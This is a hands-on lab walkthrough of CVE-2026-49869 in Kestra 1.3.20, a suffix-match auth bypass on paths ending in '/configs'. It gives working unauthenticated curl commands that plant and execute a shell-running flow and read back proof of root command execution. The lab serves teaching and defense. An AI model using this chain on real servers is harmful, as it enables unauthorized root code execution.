# Lab: The Allowlist That Matched the Ending (CVE-2026-49869)

A company runs a workflow automation platform. Everything needs a login —
except, as you'll find, any API path that happens to end with the word
`configs`. Your job: walk through that gap, plant a workflow, run it, and
read back proof that your commands executed as root.

*Time: ~30–45 min · Level: Beginner · Needs: Docker + a web browser*

## What you'll learn

- The difference between a suffix match and an exact match — and why it
  matters in allowlists
- How to map which endpoints enforce auth using status codes alone
- How an auth bypass becomes RCE through a product's own features
- How to exfiltrate proof when command output never comes back to you

## Key ideas

- **Kestra** — a platform that runs automated workflows ("flows" written in
  YAML). Each flow has tasks; script tasks run shell commands inside
  short-lived Docker containers called workers.
- **Basic Auth** — username plus password on every request. This server has
  it on. You don't know the credentials.
- **Tenant and namespace** — Kestra organizes things by tenant (this one:
  `main`) and namespace (like folders). API paths include both.
- **KV store** — a key-value cupboard where flows keep small values. You'll
  use one key as your mailbox.
- **Exit code** — the number a command returns when it finishes: `0` means
  success, anything else is yours to choose. That choice becomes your
  proof.

## Your target

One container: **Kestra 1.3.20**, port **8090**, basic auth enabled,
credentials unknown. The worker containers it spawns run as root.

## Setup

```bash
docker compose up -d --build
```

Kestra is Java and takes a minute or two to wake up. If curl refuses the
connection, wait and retry. Confirm it's up — no login needed:

```bash
curl -s http://localhost:8090/api/v1/configs
```

```
{"uuid":"...","version":"1.3.20","edition":"OSS",...}
```

A public endpoint handing you the exact version. Remember `1.3.20`.

## Task 1 — Confirm the locks

**Goal:** verify auth is really on before looking for where it isn't.

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8090/
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8090/api/v1/main/flows
```

```
307
401
```

The front page redirects to the login UI (`/ui/` — open it in a browser and
you'll see the login form). The API answers `401 Unauthorized` without
credentials. Auth works here. Remember that `401`: from here on, it means
"the filter stopped you". Anything else — `200`, `404`, even `500` — means
your request got *past* the filter.

## Task 2 — Research the version

**Goal:** find out what's publicly known about Kestra 1.3.20.

Search CVE databases and security writeups for this version. You will find
CVE-2026-49869, and the reports agree on the claim:

- the auth filter whitelists paths with a **suffix match** on `/configs`
  instead of an exact match
- any API path ending in `configs` skips authentication entirely
- that gap reaches flow creation and execution — and script tasks mean RCE
- 1.3.20 is affected; fixed in 1.0.45 and 1.3.21

Hypothesis, not fact. Your server reports 1.3.20, which matches — now prove
it against *this* server.

## Task 3 — Test the suffix

**Goal:** show the filter cares about endings, not paths.

Same API, two endings. This one doesn't end in `configs`:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8090/api/v1/main/flows
```

```
401
```

Locked. Now write a value to a key literally named `configs` (plain text
body, no credentials):

```bash
curl -s -w '\n[%{http_code}]\n' -X PUT -H 'Content-Type: text/plain' \
  'http://localhost:8090/api/v1/main/namespaces/configs/kv/configs' \
  --data-binary 'firstcontact'
curl -s 'http://localhost:8090/api/v1/main/namespaces/configs/kv/configs'
```

```
[200]
{"type":"STRING","value":"firstcontact",...}
```

You just wrote to and read from the secrets store with no login. Same
server, same API — the only difference is the ending.

One more, to sharpen the rule. This path ends in `configs` but matches no
real route:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8090/api/v1/main/configs
```

```
404
```

`404`, not `401`: through the filter, nothing there. That contrast is your
compass for the rest of the lab — `401` stopped at the gate, anything else
got inside.

## Task 4 — Plant a flow

**Goal:** create a workflow without credentials, through a path that ends
right.

Flow creation lives at `POST /api/v1/main/flows` — no `configs` ending, so
that's locked. But the namespace-bulk path takes the namespace in the URL:
`POST /api/v1/main/flows/configs`. That ends correctly. Give it a flow
whose id is also `configs` (you'll see why in Task 5):

```bash
curl -s -X POST -H 'Content-Type: application/x-yaml' \
  'http://localhost:8090/api/v1/main/flows/configs' --data-binary 'id: configs
namespace: configs
tasks:
  - id: rce
    type: io.kestra.plugin.scripts.shell.Commands
    allowFailure: true
    commands:
      - exit 7
  - id: store
    type: io.kestra.plugin.core.kv.Set
    key: configs
    value: "{{ outputs.rce }}"' | head -c 120
```

```
[{"id":"configs","namespace":"configs","revision":1,...
```

Created, no credentials. Two things to notice. First, `allowFailure`: exit
7 *fails* the shell task on purpose, and this flag lets the second task run
anyway — the failure is the message. Second, the `store` task copies the
first task's outputs into the `configs` KV key, which you already know how
to read. The shell runs blind; the KV entry is your mailbox.

## Task 5 — Pull the trigger

**Goal:** execute the planted flow, still without credentials.

Execution takes namespace and id in the path — `configs` and `configs`:

```bash
curl -s -X POST 'http://localhost:8090/api/v1/main/executions/configs/configs' | head -c 200
```

```
{"id":"6F6bYXkJwxncnC2P2Ru14L","namespace":"configs","flowId":"configs",...
```

An execution id, no login. (Yours will differ.) The worker is spinning up a container for your
`exit 7` right now. Give it about 30 seconds (longer on a first run, while
the worker image downloads).

## Task 6 — Read the number

**Goal:** collect proof that your command ran.

```bash
curl -s 'http://localhost:8090/api/v1/main/namespaces/configs/kv/configs'
```

```
{"type":"JSON","value":{"exitCode":7,...},"revision":...}
```

There it is: `exitCode 7`. You chose 7, the server ran your command, and
the number came back through a key-value entry. Run it again with `exit 42`
(change the command in Task 4's YAML, re-run Tasks 4–6) and watch 42 come
back. Then the bonus round — `exit $(id -u)` returns the user id as the
exit code:

```
{"type":"JSON","value":{"exitCode":0,...}}
```

Zero. Your commands run as **root** inside the worker. Three numbers you
picked — 7, 42, 0 — each returned from a server you never logged into.

## What happened

The auth filter whitelisted the public config endpoint with a suffix match
instead of an exact one, so every path ending in `/configs` skipped
authentication. That gap covered KV writes, flow creation through the
namespace path, and flow execution — and since script tasks execute shell,
the chain ends in root RCE. Fixed in 1.0.45 and 1.3.21 by matching exact
paths.

For real systems:

- Allowlist checks must match exactly what you mean. Suffix, prefix, and
  substring matches all admit things you didn't intend.
- Sensitive actions need auth on every path that reaches them, including
  bulk and nested routes — those are the ones reviewers miss.
- When output doesn't come back, exfiltrate through side channels: status
  codes, timings, exit codes, and writable stores.

## Questions and answers

**Why does `401` vs `404` matter so much here?**
`401` means the auth filter rejected you before routing. `404` means you
passed the filter and no route matched. Probing shapes and sorting by code
maps the filter's coverage without credentials.

**Why must the id *and* the namespace both be `configs`?**
Creation goes through `POST /flows/configs` (namespace in path) and
execution through `POST /executions/{namespace}/{id}` (both in path).
Every segment you don't control is fixed; both controlled ones must end in
`configs` to stay inside the bypass.

**Why `allowFailure` — isn't failure bad?**
The non-zero exit *is* the message. Without the flag, the failed shell
task stops the flow and the store task never runs. With it, the number
gets delivered.

**Why do exit codes prove execution?**
Only a run command produces an exit code, and only your chosen command
produces *that* code. 7, then 42, then `id -u` → 0: three predictions,
three confirmations.

**What is the fix in one sentence?**
Match the whitelisted config paths exactly instead of by suffix, as
Kestra 1.0.45 and 1.3.21 do.

## Cleanup

```bash
docker compose down
```
